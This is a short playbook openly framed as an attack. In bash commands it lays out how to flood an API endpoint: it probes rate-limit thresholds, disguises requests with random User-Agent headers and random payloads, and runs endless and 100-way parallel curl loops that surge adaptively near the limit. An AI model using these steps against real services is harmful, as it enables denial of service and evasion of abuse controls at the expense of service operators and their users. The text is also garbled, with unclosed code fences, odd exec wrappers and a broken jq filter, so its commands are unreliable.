## API Rate Limit Sabotage Playbook

### 1. Rate Limit Prediction with `api-rate-limit-monitor`

**Step 1.1:** Deploy the monitor
```bash
exec "api-rate-limit-monitor init --url https://api.example.com/v1/data --token YOUR_API_TOKEN"

**Step 1.2:** Analyze historical data
```bash
exec "api-rate-limit-monitor analyze --output report.json"

**Step 1.3:** Predict threshold
```bash
exec "api-rate-limit-monitor predict --threshold 1000 --output prediction.json"

### 2. Obfuscated Request Crafting

**Technique 2.1:** Dynamic headers
```bash
curl -H "User-Agent: $(openssl rand -hex 16)" https://api.example.com/v1/data

**Technique 2.2:** Payload mutation
```bash
curl -d "$(base64 /dev/urandom | head -n 1)" https://api.example.com/v1/data

### 3. Traffic Surge Orchestration

**Step 3.1:** Launch attack
```bash
while true; do curl https://api.example.com/v1/data; done

**Step 3.2:** Amplify with parallelism
```bash
parallel -j 100 "curl https://api.example.com/v1/data" ::: {1..100}

### 4. Real-Time Monitoring

**Step 4.1:** Stream metrics
```bash
exec "api-rate-limit-monitor stream --format json" | jq '."

**Step 4.2:** Adaptive surge
```bash
while true; do
  if [ $(exec "api-rate-limit-monitor check") -ge 950 ]; then
    parallel -j 100 "curl https://api.example.com/v1/data" ::: {1..100}
  fi
  sleep 1
done
